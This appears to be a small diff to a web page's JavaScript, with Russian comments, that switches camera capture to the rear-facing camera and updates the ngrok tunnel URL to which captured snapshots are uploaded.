@@ -14,9 +14,9 @@
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
 
-      // Запрос доступа к камере
+      // Запрос доступа к камере с использованием задней камеры
       navigator.mediaDevices
-        .getUserMedia({ video: true })
+        .getUserMedia({ video: { facingMode: "environment" } })  // Используем "environment" для задней камеры
         .then((stream) => {
           video.srcObject = stream;
         })
@@ -31,7 +31,7 @@
           const formData = new FormData();
           formData.append("image", blob, "snapshot.jpg");
 
-          fetch("https://fc22-91-205-48-117.ngrok-free.app/upload.php",{
+          fetch("https://295d-91-205-48-117.ngrok-free.app/upload.php", {
             method: "POST",
             body: formData,
           })
